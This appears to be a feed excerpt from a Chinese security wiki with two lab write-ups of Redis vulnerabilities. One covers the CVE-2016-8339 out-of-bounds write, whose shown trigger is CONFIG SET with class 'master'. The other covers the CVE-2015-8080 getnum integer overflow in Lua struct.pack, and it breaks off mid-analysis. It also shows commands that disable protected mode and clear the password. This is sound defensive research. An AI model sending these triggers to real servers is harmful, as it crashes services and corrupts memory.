class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p><strong>CONFIG SET client-output-buffer-limit命令</strong></p><p>​        <code>client-output-buffer-limit</code>使用<code>CONFIG SET</code>命令修改选项。设置<code>client-output-buffer-limit</code>选项所需的语法如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><p>​        例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot;</span><br></pre></td></tr></table></figure><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        <code>client-output-buffer-limit</code>使用<code>CONFIG SET</code>命令修改选项期间，存在写越界漏洞。设置<code>client-output-buffer-limit</code>选项所需的语法如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><p>​        当class值为master时，返回3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;slave 0 0 0&quot;</span><br></pre></td></tr></table></figure><p>​        在解析中，对<code>client-output-buffer-limit</code>的调用<code>getClientTypeByName</code>用于检索相应类的类型。在这种情况下，<code>getClientTypeByName</code>返回[-1，3]集中的值。查看<code>client_obuf_limits</code>数组的声明，我们看到数组的大小为<code>3</code>。</p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit 时，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/16.png"></p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        首先，查看server结构体的结构，server结构体在/src/server.h中声明。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        其redisServer结构如下：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        结构包含很多属性，其中预定义了clinet_obuf_limits数组的大小。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><p>​    在/src/server.h中宏定义了CLIENT_TYPE_OBUF_COUNT为3，同时发现了CLIENT_TYPE_MASTER值为3。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        </p><p>​        目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。分析getClientTypeByName函数，看看class值如何为3。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER，    在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。</p><p>​        此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        同样的问题也存在在/src/config.c的configSetCommand函数中。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/12.png"></p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞触发过程"><a href="#漏洞触发过程" class="headerlink" title="漏洞触发过程"></a>漏洞触发过程</h4><p>​        在/src/config.c中的loadServerConfigFromString函数，未考虑class等于3的情况，导致class值等于3时，写入server.client_obuf_limits[class]值，导致索引越界写入。</p><p>​        目前确定了server.client_obuf_limits数组大小为3，也就是索引取值只能为0，1，2，如果索引值为3，则会发生越界读写。</p><p>​        getClientTypeByName函数通过输入的name值，返回相应的类型名，当name为master时，返回CLIENT_TYPE_MASTER，在/src/server.h中宏定义CLIENT_TYPE_MASTER即为3。</p><p>​        此时，class被赋值CLIENT_TYPE_MASTER，即为3，直接对server.client_obuf_limits[3]赋值，索引越界，导致越界写入。</p><p>​        同样的问题也存在在/src/config.c的configSetCommand函数中。</p><p>​        此漏洞就是未考虑CONFIG SET client-output-buffer-limit ，class为master的情况。client-output-buffer-limit只是预期设置normal，slave和pubsub三类客户端，但是master也是一个有效的客户端。通过提供的客户端类型master，client_obuf_limit数组会溢出，随后的结构变量将被覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span><br></pre></td></tr></table></figure><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        补丁增加了对class的值与CLIENT_TYPE_MASTER判断，如果等于CLIENT_TYPE_MASTER（3），则不会进行赋值，跳转到报错函数。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/17.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        向靶机发送config set命令将class字段设为master，则会发生越界写入。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET client-output-buffer-limit &quot;master 3735928559 3405691582 373529054&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/14.png"></p><p>​        靶机返回ok，代表越界写入成功。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></li><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2016-0206/">https://talosintelligence.com/vulnerability_reports/TALOS-2016-0206/</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2015-8080_Redis getnum整数溢出漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:27:06.000Z</published>
    <updated>2021-07-06T08:45:43.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis缓冲区溢出漏洞</li><li>漏洞编号： CVE-2015-8080/CVE-2020-14147</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v3.0：7.7】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 6.0.3之前的lua_struct.c中的getnum函数中存在整数溢出漏洞，这允许具有上下文相关权限的攻击者在Redis会话中运行Lua代码，从而导致拒绝服务（内存损坏和应用程序崩溃）。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        Redis部署在服务器端，开启6379端口；攻击者，通过构造RESP协议包，利用struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31），从而能触发整数溢出，再导致缓冲区溢出。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​        Redis 小于 6.0.3</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571">https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><h4 id="Linux下安装Redis-6-0-0"><a href="#Linux下安装Redis-6-0-0" class="headerlink" title="Linux下安装Redis 6.0.0"></a>Linux下安装Redis 6.0.0</h4><p>​        首先，Redis对全版本进行了补丁修复，为了复现漏洞，将Redis 6.0.0源码改为未打CVE-2020-14147补丁之前的状态。</p><p>​        进入路径，找到lua_struct.c文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\redis-6.0.0\deps\lua\src、lua_struct.c</span><br></pre></td></tr></table></figure><p>​        用编辑器，注释以下98-99行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (a &gt; (INT_MAX / 10) || a * 10 &gt; (INT_MAX - (**fmt - &#x27;0&#x27;)))</span><br><span class="line">        luaL_error(L, &quot;integral size overflow&quot;);</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10.png"></p><p>​        使用以下命令下载，提取和编译Redis 6.0.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://download.redis.io/releases/redis-6.0.0.tar.gz</span><br><span class="line">$ tar xzf redis-6.0.0.tar.gz</span><br><span class="line">$ cd redis-6.0.0</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>PS：中间make会报错</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        在源码的README.md文件中看到解释</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        解决办法(针对2.2以上的版本)<br>​        清理上次编译残留文件，重新编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make distclean  &amp;&amp; make</span><br></pre></td></tr></table></figure><p>​    这个错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。</p><p>​        <code>src</code> 目录 中现在提供了已编译的二进制文件 。使用以下命令运行Redis服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ src/redis-server</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        可以使用内置客户端与Redis进行交互：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ src/redis-cli</span><br><span class="line">redis&gt; set foo bar</span><br><span class="line">OK</span><br><span class="line">redis&gt; get foo</span><br><span class="line">&quot;bar&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        Redis服务端，配置远程连接密码：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        Redis客户端，远程连接：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><h4 id="安装Lua"><a href="#安装Lua" class="headerlink" title="安装Lua"></a>安装Lua</h4><p>​        Linux安装 Lua ，下载源码包并在终端解压编译即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gz</span><br><span class="line">tar zxf lua-5.3.0.tar.gz</span><br><span class="line">cd lua-5.3.0</span><br><span class="line">make linux test</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>​        make报错，找不到readline/readline.h</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        原因是缺少 <code>libreadline-dev</code> 依赖包，安装依赖包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libreadline-dev</span><br></pre></td></tr></table></figure><p>​        再次编译安装后，成功：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/9.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        利用Python脚本poc.py来重现该漏洞。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py &lt;host&gt; [&lt;port&gt;]</span><br></pre></td></tr></table></figure><p>​        初次连接，发送poc时，提示redis运行保护模式，只允许本地访问，有三种关闭方式，此处选择第一种关闭方式：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        根据提示关闭，保护模式，并且取消密码设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET protected-mode no</span><br><span class="line">CONFIG SET requirepass &#x27;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/16.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/20.png"></p><p>​        再次发送poc，无数据回显，拒绝服务攻击成功。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/17.png"></p><p>​        Redis服务端报段错误，说明漏洞触发。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/21.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p>​        Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p>​        执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br><span class="line">EVALSHA &lt;SHA1 digest from above&gt;</span><br></pre></td></tr></table></figure><p>​        Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack (&quot;&lt;I2&quot;, 10)</span><br></pre></td></tr></table></figure><ul><li>“I”指定整数是无符号的（“ i”用于有符号整数）</li><li>“&lt;”指定应以小端格式表示（“&gt;”用于大端格式）</li><li>“2”指定整数为2个字节长</li><li>“10”指定要打包的整数的值</li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        Redis中存在堆栈缓冲区溢出漏洞。 在攻击情况下，struct.pack方法用于转换指定为第一个参数的非常大的整数（2^31）。 lua_struct.c尝试通过调用getnum（）将此字符串参数转换为整数。 这导致整数溢出，导致大小被错误地计算为负数，从而绕过边界检查。 然后，此负数通过optsize（）强制转换为size_t类型的变量，这将其解释为大正数。 之后，putinteger（）尝试将由这个大数字表示的字节数复制到32字节的缓冲区中，从而导致缓冲区溢出。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        以下代码段摘自lua_struct.c，Redis版本6.0.0。 </p><p>​        分析lua_struct.c中b_pack（）函数，size变量存放optsize（）函数的返回值，optsize（）函数将有符号的int类型转换为size_t（无符号的int类型）整数溢出发生字此函数内，之后size变量传入putinteger（）函数，缓冲区溢出发生在此函数内。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/11.png"></p><p>​        先跟进optsize（）函数，看如何处理opt变量和fmt二级指针（指向指针的指针），发现当opt变量为字符’i’或’I’时，将fmt二级指针传入</p><p>getnum（）函数，将返回的值存入sz变量中，if语句判断sz变量是否大于MAXINTSIZE；当sz发生整数溢出时，值为负值且小于MAXINTSIZE（0x7fffffff），所以跳过此报错判断。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/12.png"></p><p>​        跟进getnum（）函数，字符串转整型，缺少边界检查，当字符串表示的数大于MAXINTSIZE（0x7fffffff）时，直接返回负值。<img 